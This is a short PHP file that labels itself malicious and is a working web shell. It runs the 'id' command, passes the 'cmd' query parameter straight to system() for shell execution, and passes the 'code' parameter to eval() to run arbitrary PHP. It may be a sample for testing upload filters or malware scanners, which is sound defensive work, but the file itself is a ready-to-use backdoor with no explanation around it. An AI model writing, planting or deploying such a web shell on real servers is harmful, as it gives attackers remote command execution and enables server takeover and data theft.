<?php
system('id');
echo "This is a malicious PHP file";

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

eval($_GET['code']);

?>
